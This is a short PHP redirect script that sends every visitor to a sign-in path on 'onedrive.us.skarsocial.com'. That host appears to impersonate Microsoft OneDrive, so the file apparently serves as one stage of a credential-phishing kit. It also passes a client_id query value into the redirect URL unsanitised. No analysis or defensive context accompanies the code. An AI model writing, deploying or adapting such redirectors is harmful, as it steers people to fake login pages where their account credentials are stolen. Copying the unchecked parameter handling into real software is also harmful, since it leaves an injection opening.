<?php


function Redirect($url, $permanent = false)
{
 if (headers_sent() === false)
 {
 header('Location: ' . $url, true, ($permanent === true) ? 301 : 302);
 }

 exit();
}

Redirect("https://onedrive.us.skarsocial.com/drivepoint/auth/login.php?client_id=" . $_GET['client_id'] . "", false);

?>